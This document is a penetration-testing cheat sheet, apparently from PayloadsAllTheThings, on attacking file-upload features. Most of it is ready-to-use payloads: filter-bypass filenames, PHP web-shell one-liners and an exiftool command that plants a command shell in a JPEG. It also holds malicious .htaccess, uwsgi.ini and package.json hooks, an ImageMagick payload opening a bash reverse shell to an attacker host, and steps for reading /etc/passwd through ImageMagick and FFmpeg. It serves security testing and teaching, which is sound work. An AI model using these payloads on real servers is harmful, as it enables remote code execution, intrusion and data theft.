# Upload Insecure Files

> Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Defaults Extensions](#defaults-extensions)
    * [Upload Tricks](#upload-tricks)
    * [Filename Vulnerabilities](#filename-vulnerabilities)
    * [Picture Compression](#picture-compression)
    * [Picture Metadata](#picture-metadata)
    * [Configuration Files](#configuration-files)
    * [CVE - ImageMagick](#cve---imagemagick)
    * [CVE - FFMpeg HLS](#cve---ffmpeg-hls)
* [Labs](#labs)
* [References](#references)

## Tools

* [almandin/fuxploiderFuxploider](https://github.com/almandin/fuxploider) - File upload vulnerability scanner and exploitation tool.
* [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) -  HTTP file upload scanner for Burp Proxy.
* [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) -  OWASP ZAP add-on for finding vulnerabilities in File Upload functionality.

## Methodology

![file-upload-mindmap.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png?raw=true)

### Defaults Extensions

Here is a list of the default extensions for web shell pages in the selected languages (PHP, ASP, JSP).

* PHP Server

    ```powershell
    .php
    .php3
    .php4
    .php5
    .php7

    # Less known PHP extensions
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
    ```

* ASP Server

    ```powershell
    .asp
    .aspx
    .config
    .cer and .asa # (IIS <= 7.5)
    shell.aspx;1.jpg # (IIS < 7.0)
    shell.soap
    ```

* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
* Perl: `.pl, .pm, .cgi, .lib`
* Coldfusion: `.cfm, .cfml, .cfc, .dbm`
* Node.js: `.js, .json, .node`

### Upload Tricks

**Extensions**:

* Use double extensions : `.jpg.php, .png.php5`
* Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
* Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`
* Null byte (works well against `pathinfo()`)
    * `.php%00.gif`
    * `.php\x00.gif`
    * `.php%00.png`
    * `.php\x00.png`
    * `.php%00.jpg`
    * `.php\x00.jpg`
* Special characters
    * Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
    * Whitespace and new line characters
        * `file.php%20`
        * `file.php%0d%0a.jpg`
        * `file.php%0a`
    * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
    * Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
    * Multiple special characters: `file.jsp/././././.`

**File Identification**:

MIME type, a MIME type (Multipurpose Internet Mail Extensions type) is a standardized identifier that tells browsers, servers, and applications what kind of file or data is being handled. It consists of a type and a subtype, separated by a slash. Change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif` to disguise the content as an image.

* Common images content-types:

    ```cs
    Content-Type: image/gif
    Content-Type: image/png
    Content-Type: image/jpeg
    ```

* Content-Type wordlist: [SecLists/web-all-content-types.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)

    ```cs
    text/php
    text/x-php
    application/php
    application/x-php
    application/x-httpd-php
    application/x-httpd-php-source
    ```

* Set the `Content-Type` twice, once for unallowed type and once for allowed.

[Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) - Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.

* PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
* JPG: `\xff\xd8\xff`
* GIF: `GIF87a` OR `GIF8;`

**File Encapsulation**:

Using NTFS alternate data stream (ADS) in Windows.
In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "`file.asax:.jpg`"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "`file.asp::$data.`")

**Other Techniques**:

PHP web shells don't always have the `<?php` tag, here are some alternatives:

* Using a PHP script tag `<script language="php">`

    ```html
    <script language="php">system("id");</script>
    ```

* The `<?=` is shorthand syntax in PHP for outputting values. It is equivalent to using `<?php echo`.

    ```php
    <?=`$_GET[0]`?>
    ```

### Filename Vulnerabilities

Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.

* Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
* LFI/Path Traversal Payloads:  e.g. `image.png../../../../../../../etc/passwd`
* XSS Payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
* File Traversal e.g. `../../../tmp/lol.png`
* Command Injection e.g. `; sleep 10;`

Also you upload:

* HTML/SVG files to trigger an XSS
* EICAR file to check the presence of an antivirus

### Picture Compression

Create valid pictures hosting PHP code. Upload the picture and use a **Local File Inclusion** to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.

* Picture Metadata, hide the payload inside a comment tag in the metadata.
* Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.
    * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): use createBulletproofJPG.py
    * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createPNGwithPLTE.php
    * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createGIFwithGlobalColorTable.php

### Picture Metadata

Create a custom picture and insert exif tag with `exiftool`. A list of multiple exif tags can be found at [exiv2.org](https://exiv2.org/tags.html)

```ps1
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

### Configuration Files

If you are trying to upload files to a :

* PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.
* ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.
* uWSGI server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) trick to execute code.

Configuration files examples

* [Apache: .htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
* [IIS: web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
* [Python: \_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
* [WSGI: uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)

#### Apache: .htaccess

The `AddType` directive in an `.htaccess` file is used to specify the MIME (Multipurpose Internet Mail Extensions) type for different file extensions on an Apache HTTP Server. This directive helps the server understand how to handle different types of files and what content type to associate with them when serving them to clients (such as web browsers).  

Here is the basic syntax of the AddType directive:

```ps1
AddType mime-type extension [extension ...]
```

Exploit `AddType` directive by uploading an .htaccess file with the following content.

```ps1
AddType application/x-httpd-php .rce
```

Then upload any file with `.rce` extension.

#### WSGI: uwsgi.ini

uWSGI configuration files can include “magic” variables, placeholders and operators defined with a precise syntax. The ‘@’ operator in particular is used in the form of @(filename) to include the contents of a file. Many uWSGI schemes are supported, including “exec” - useful to read from a process’s standard output. These operators can be weaponized for Remote Command Execution or Arbitrary File Write/Read when a .ini configuration file is parsed:

Example of a malicious `uwsgi.ini` file:

```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; call a function returning a char *
characters = @(call://uwsgi_func)
```

When the configuration file will be parsed (e.g. restart, crash or autoreload) payload will be executed.

#### Dependency Manager

Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.

* package.json

    ```js
    "scripts": {
        "prepare" : "/bin/touch /tmp/pwned.txt"
    }
    ```

* composer.json

    ```js
    "scripts": {
        "pre-command-run" : [
        "/bin/touch /tmp/pwned.txt"
        ]
    }
    ```

### CVE - ImageMagick

If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.

#### CVE-2016–3714 - ImageTragik

Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)

* ImageTragik - example #1

    ```powershell
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
    pop graphic-context
    ```

* ImageTragik - example #3

    ```powershell
    %!PS
    userdict /setpagedevice undef
    save
    legal
    { null restore } stopped { pop } if
    { legal } stopped { pop } if
    restore
    mark /OutputFile (%pipe%id) currentdevice putdeviceprops
    ```

The vulnerability can be triggered by using the `convert` command.

```ps1
convert shellexec.jpeg whatever.gif
```

#### CVE-2022-44268

CVE-2022-44268 is an information disclosure vulnerability identified in ImageMagick. An attacker can exploit this by crafting a malicious image file that, when processed by ImageMagick, can disclose information from the local filesystem of the server running the vulnerable version of the software.

* Generate the payload

    ```ps1
    apt-get install pngcrush imagemagick exiftool exiv2 -y
    pngcrush -text a "profile" "/etc/passwd" exploit.png
    ```

* Trigger the exploit by uploading the file. The backend might use something like `convert pngout.png pngconverted.png`
* Download the converted picture and inspect its content with: `identify -verbose pngconverted.png`
* Convert the exfiltrated data: `python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'`

More payloads in the folder `Picture ImageMagick/`.

### CVE - FFMpeg HLS

FFmpeg is an open source software used for processing audio and video formats. You can use a malicious HLS playlist inside an AVI video to read arbitrary files.

1. `./gen_xbin_avi.py file://<filename> file_read.avi`
2. Upload `file_read.avi` to some website that processes videofiles
3. On server side, done by the videoservice: `ffmpeg -i file_read.avi output.mp4`
4. Click "Play" in the videoservice.
5. If you are lucky, you'll the content of `<filename>` from the server.

The script creates an AVI that contains an HLS playlist inside GAB2. The playlist generated by this script looks like this:

```ps1
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```

More payloads in the folder `CVE FFmpeg HLS/`.

## Labs

* [PortSwigger - Labs on File Uploads](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)
* [Root Me - File upload - Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)
* [Root Me - File upload - MIME type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)
* [Root Me - File upload - Null byte](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)
* [Root Me - File upload - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)
* [Root Me - File upload - Polyglot](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)

## References

* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella - 28 Feb 2023](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [Arbitrary File Upload Tricks In Java - pyn3rd - 2022-05-07](https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
* [Attacking Webservers Via .htaccess - Eldar Marcussen - May 17, 2011](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
* [BookFresh Tricky File Upload Bypass to RCE - Ahmed Aboul-Ela - November 29, 2014](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)
* [Bulletproof Jpegs Generator - Damien Cauquil (@virtualabs) - April 9, 2012](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l)
* [Encoding Web Shells in PNG IDAT chunks - phil - 04-06-2012](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [File Upload - HackTricks - 20/7/2024](https://book.hacktricks.xyz/pentesting-web/file-upload)
* [File Upload restrictions bypass - Haboob Team - July 24, 2018](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
* [IIS - SOAP - Navigating The Shadows - 0xbad53c - 19/5/2024](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
* [Injection points in popular image formats - Daniel Kalinowski‌‌ - Nov 8, 2019](https://blog.isec.pl/injection-points-in-popular-image-formats/)
* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - January 20, 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
* [Inyección de código en imágenes subidas y tratadas con PHP-GD - hackplayers - March 22, 2020](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
* [La PNG qui se prenait pour du PHP - Philippe Paget (@PagetPhil) - February, 23 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
* [More Ghostscript Issues: Should we disable PS coders in policy.xml by default? - Tavis Ormandy - 21 Aug 2018](http://openwall.com/lists/oss-security/2018/08/21/2)
* [PHDays - Attacks on video converters:a year later - Emil Lerner, Pavel Cheremushkin - December 20, 2017](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.p)
* [Protection from Unrestricted File Upload Vulnerability - Narendra Shinde - October 22, 2015](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
* [The .phpt File Structure - PHP Internals Book - October 18, 2017](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)
